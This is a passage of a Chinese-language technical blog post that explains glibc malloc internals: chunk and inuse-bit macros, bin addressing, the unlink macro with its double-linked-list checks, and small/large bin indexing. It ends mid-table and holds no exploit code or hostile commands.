bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>得到堆块 p 中的 size 位的值，因为堆块是对齐的，所以后三位没有用而且也不算大小</p><p>此处清空后三位</p><h3 id="next-chunk-p-宏"><a href="#next-chunk-p-宏" class="headerlink" title="next_chunk(p) 宏"></a>next_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br></pre></td></tr></table></figure><p>mchunkptr 结构体指针变量的定义：<code>typedef struct malloc_chunk* mchunkptr;</code></p><p>该宏的作用就是得到当前堆块的下一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址加上<strong>当前堆</strong>大小 size ，那么得到的值就是下一个堆块的地址了</p><h3 id="prev-chunk-p-宏"><a href="#prev-chunk-p-宏" class="headerlink" title="prev_chunk(p) 宏"></a>prev_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br></pre></td></tr></table></figure><p>该宏的作用就是得到当前堆块的前一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址减去<strong>前一个堆</strong>大小 size，那么得到的值就是前一个堆块的地址</p><p>不过 pre_size 只有在前一个堆块处于空闲状态的时候才会在当前堆块中有值</p><h3 id="chunk-at-offset-p-s-宏"><a href="#chunk-at-offset-p-s-宏" class="headerlink" title="chunk_at_offset(p, s) 宏"></a>chunk_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>也是获得一个堆块的地址，不过是通过指定偏移大小的方式</p><h3 id="inuse-p-宏"><a href="#inuse-p-宏" class="headerlink" title="inuse(p) 宏"></a>inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)                           \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>获取下一个堆块的 PREV_INUSE 位，也就是说该宏是用来判断当前堆块是否处于空闲状态的</p><p>若是处于空闲状态就返回1，否则返回 0</p><h3 id="set-inuse-p-宏"><a href="#set-inuse-p-宏" class="headerlink" title="set_inuse(p) 宏"></a>set_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)                           \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br></pre></td></tr></table></figure><p>这个宏的作用就是通过当前堆块的大小及地址得到下一个堆块的地址</p><p>然后将下一个堆块的 PREV_INUSE 位设置为 1</p><h3 id="clear-inuse-p-宏"><a href="#clear-inuse-p-宏" class="headerlink" title="clear_inuse(p) 宏"></a>clear_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)                          \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br></pre></td></tr></table></figure><p>该函数的作用是清除掉 PREV_INUSE 位，<code>~(PREV_INUSE)</code> 的值是 -2</p><h3 id="inuse-bit-at-offset-p-s-宏"><a href="#inuse-bit-at-offset-p-s-宏" class="headerlink" title="inuse_bit_at_offset(p, s) 宏"></a>inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)                    \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-inuse-bit-at-offset-p-s-宏"><a href="#set-inuse-bit-at-offset-p-s-宏" class="headerlink" title="set_inuse_bit_at_offset(p, s) 宏"></a>set_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                     \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>set_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="clear-inuse-bit-at-offset-p-s-宏"><a href="#clear-inuse-bit-at-offset-p-s-宏" class="headerlink" title="clear_inuse_bit_at_offset(p, s) 宏"></a>clear_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                   \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br></pre></td></tr></table></figure><p>类似于 <code>clear_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-head-size-p-s-宏"><a href="#set-head-size-p-s-宏" class="headerlink" title="set_head_size(p, s) 宏"></a>set_head_size(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，并且<strong>不会</strong>影响到该堆块的使用位</p><h3 id="set-head-p-s-宏"><a href="#set-head-p-s-宏" class="headerlink" title="set_head(p, s) 宏"></a>set_head(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，该方法<strong>会</strong>影响到该堆块的使用位</p><h3 id="set-foot-p-s-宏"><a href="#set-foot-p-s-宏" class="headerlink" title="set_foot(p, s) 宏"></a>set_foot(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure><p>设置下一个堆块的 prev_size 位，该宏只有在当前堆块为空闲堆块时才会使用</p><p>看样子这个宏是专门在下一个堆块的 prev_size 位设置当前堆块的大小的</p><p>而且就算是该堆块的地址被申请回来了，那么下一个堆块的 prev_size位也不会改变</p><h2 id="Internal-data-structures"><a href="#Internal-data-structures" class="headerlink" title="Internal data structures"></a>Internal data structures</h2><h3 id="mbinptr-结构体指针变量"><a href="#mbinptr-结构体指针变量" class="headerlink" title="mbinptr 结构体指针变量"></a>mbinptr 结构体指针变量</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   All internal state is held in an instance of malloc_state defined</span></span><br><span class="line"><span class="comment">   below. There are no other static variables, except in two optional</span></span><br><span class="line"><span class="comment">   cases:</span></span><br><span class="line"><span class="comment"> * If USE_MALLOC_LOCK is defined, the mALLOC_MUTEx declared above.</span></span><br><span class="line"><span class="comment"> * If mmap doesn&#x27;t support MAP_ANONYMOUS, a dummy file descriptor</span></span><br><span class="line"><span class="comment">     for mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Beware of lots of tricks that minimize the total bookkeeping space</span></span><br><span class="line"><span class="comment">   requirements. The result is a little over 1K bytes (for 4byte</span></span><br><span class="line"><span class="comment">   pointers and size_t.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br></pre></td></tr></table></figure><p>跟 <code>mchunkptr</code> 差不多，不过是用在 bin（空闲堆块）里的</p><h3 id="bin-at-m-i-宏"><a href="#bin-at-m-i-宏" class="headerlink" title="bin_at(m, i) 宏"></a>bin_at(m, i) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))                \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure><p>该宏用于获得某种类型的 bins 的某一个 bin 的地址，且该 bins 的基地址下标是 1 ，而不能是 0</p><h3 id="next-bin-b-宏（缺具体）"><a href="#next-bin-b-宏（缺具体）" class="headerlink" title="next_bin(b) 宏（缺具体）"></a>next_bin(b) 宏（缺具体）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure><p>获取下一个 bin 的地址</p><h3 id="first-b-宏"><a href="#first-b-宏" class="headerlink" title="first(b) 宏"></a>first(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 fd 指针</p><h3 id="last-b-宏"><a href="#last-b-宏" class="headerlink" title="last(b) 宏"></a>last(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 bk 指针</p><h3 id="unlink-AV-P-BK-FD-宏（重点）（缺）"><a href="#unlink-AV-P-BK-FD-宏（重点）（缺）" class="headerlink" title="unlink(AV, P, BK, FD) 宏（重点）（缺）"></a>unlink(AV, P, BK, FD) 宏（重点）（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                               \</span><br><span class="line">    BK = P-&gt;bk;                               \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))           \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                            \</span><br><span class="line">        FD-&gt;bk = BK;                           \</span><br><span class="line">        BK-&gt;fd = FD;                           \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                  \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">       <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)       \</span><br><span class="line">      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">         malloc_printerr (check_action,                  \</span><br><span class="line">                <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                P, AV);                   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                  \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;           \</span><br><span class="line">                <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;              \</span><br><span class="line">                  &#125;                            \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span><br><span class="line">              &#125;                               \</span><br><span class="line">          &#125;                               \</span><br><span class="line">      &#125;                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 - 4 行：<code>FD = P-&gt;fd</code> 和 <code>BK = P-&gt;bk</code> 是分别获取传入参数 P 的前驱节点和后继节点5</p><p>5 行：if 语句用于判断 P 的前驱节点的后继节点是否为 P，P的后继节点的前驱节点是否为 P，且要通过条件最后返回值为 0</p><p>6 行：如果第五行的返回值为 1，那么就调用 <code>malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV)</code></p><p>7 - 9 行：如果返回值是 0，进入 else 语句，并且让 <strong>P 的前驱节点的后继节点变成 P 的后继节点</strong></p><p>​                再让 <strong>P 的后继节点的前驱节点变成 P 的前驱节点</strong>，完成删除双向链表上的 P 节点的操作</p><p>10 - 11 行：</p><h2 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h2><h3 id="NBINS-宏"><a href="#NBINS-宏" class="headerlink" title="NBINS 宏"></a>NBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br></pre></td></tr></table></figure><p>规定计算正常 bin 大小时的基准值</p><h3 id="NSMALLBINS-宏"><a href="#NSMALLBINS-宏" class="headerlink" title="NSMALLBINS 宏"></a>NSMALLBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>规定计算正常 smallbin 大小时的基准值</p><h3 id="SMALLBIN-WIDTH-宏"><a href="#SMALLBIN-WIDTH-宏" class="headerlink" title="SMALLBIN_WIDTH 宏"></a>SMALLBIN_WIDTH 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br></pre></td></tr></table></figure><p>正常情况在 32 位下，这个值是 0x08；在 64 下这个值是 0x10</p><h3 id="SMALLBIN-CORRECTION-宏"><a href="#SMALLBIN-CORRECTION-宏" class="headerlink" title="SMALLBIN_CORRECTION 宏"></a>SMALLBIN_CORRECTION 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>这种就是在非正常情况下会有返回值 1，即在满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 时</p><h3 id="MIN-LARGE-SIZE-宏"><a href="#MIN-LARGE-SIZE-宏" class="headerlink" title="MIN_LARGE_SIZE 宏"></a>MIN_LARGE_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure><p>用于规定 smallbin 的最大值(不等于)和 largebin 的最大值</p><p>正常情况下 64 位的最小值为 <code>(64 - 0) * 0x10 == 0x400</code>；32 位的最小值为 <code>(64 - 0) * 0x08 == 0x200</code></p><h3 id="in-smallbin-range-sz-宏"><a href="#in-smallbin-range-sz-宏" class="headerlink" title="in_smallbin_range(sz) 宏"></a>in_smallbin_range(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure><p>如果一个 chunk 的 size 小于 MIN_LARGE_SIZE，那么该 chunk 就属于 smallbin</p><h3 id="smallbin-index-sz-宏"><a href="#smallbin-index-sz-宏" class="headerlink" title="smallbin_index(sz) 宏"></a>smallbin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p>SMALLBIN_CORRECTION 是用来兼容 <code>long double</code> 的</p><p>这个宏的主要意思就是在 64 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 4</code> 来规划</p><p>在 32 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 3</code> 来规划</p><p>且可以看出 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 的兼容操作只可能会在 32 位系统上出现</p><h3 id="largebin-index-32-sz-宏"><a href="#largebin-index-32-sz-宏" class="headerlink" title="largebin_index_32(sz) 宏"></a>largebin_index_32(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧，这个是一般情况下 32 位的 largebin 分布</p><h3 id="largebin-index-32-big-sz-宏"><a href="#largebin-index-32-big-sz-宏" class="headerlink" title="largebin_index_32_big(sz) 宏"></a>largebin_index_32_big(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧</p><p>这个是满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 下 32 位的 largebin 分布</p><h3 id="largebin-index-64-sz-宏"><a href="#largebin-index-64-sz-宏" class="headerlink" title="largebin_index_64(sz) 宏"></a>largebin_index_64(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>可以看到大小为 <code>0x400</code> 的 chunk 对应的 index 为 <code>(0x400 &gt;&gt; 6) + 48</code> 即 64</p><p>而 index 为 64 对应的范围是 <code>[0x400, 0x400 + 1 &gt;&gt; 6)</code> 即 <code>[0x400, 0x440)</code></p><p>在这个级别的 index 中，size 的范围为 0x40（1&lt;&lt;6），依次类推 size 与 index 对应的关系是：</p><table><thead><tr><th align="center"></th><th align="center">size</th><th align="center">index</th></tr></thead><tbody><tr><td align="center">等差 0x40</td><td align="center">[0x400 , 0x440)</td><td align="center">64</td></tr><tr><td align="center"></td><td align="center">[0x440 , 0x480)</td><td align="center">65</td></tr><tr><td align="center"></td><td 